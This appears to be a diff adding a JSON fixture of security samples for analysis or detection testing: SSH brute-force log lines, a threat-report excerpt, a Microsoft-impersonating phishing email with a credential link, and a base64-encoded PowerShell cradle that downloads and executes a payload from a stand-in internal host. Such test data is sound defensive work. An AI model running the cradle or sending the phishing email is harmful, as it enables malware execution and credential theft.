@@ -1,0 +1,16 @@
+{
+  "log_entries": [
+    "Dec 30 14:23:15 server01 sshd[12345]: Failed password for admin from 185.220.101.5 port 45123 ssh2",
+    "Dec 30 14:23:45 server01 sshd[12346]: Failed password for admin from 185.220.101.5 port 45124 ssh2",
+    "Dec 30 14:24:02 server01 sshd[12347]: Failed password for root from 185.220.101.5 port 45125 ssh2",
+    "Dec 30 14:24:30 server01 sshd[12348]: Accepted publickey for developer from 10.0.0.50 port 52341 ssh2"
+  ],
+  "threat_report_excerpt": "The threat actor known as APT-X has been observed using spear-phishing emails with malicious Office documents. The documents contain VBA macros that download a second-stage payload from compromised WordPress sites. Initial indicators include connections to 45.33.32.156 and domains matching the pattern update-service[.]*.com. The malware establishes persistence through scheduled tasks named 'WindowsUpdate' and communicates with C2 servers over HTTPS on port 443.",
+  "suspicious_email": {
+    "from": "security-alert@microsoft-verify.com",
+    "to": "john.smith@company.com",
+    "subject": "URGENT: Your Microsoft 365 password expires in 24 hours",
+    "body": "Dear User,\n\nYour Microsoft 365 password will expire in 24 hours. Click the link below to verify your account and avoid service interruption:\n\nhttps://microsoft-verify.com/reset?id=abc123\n\nMicrosoft Security Team"
+  },
+  "powershell_command": "powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
+}
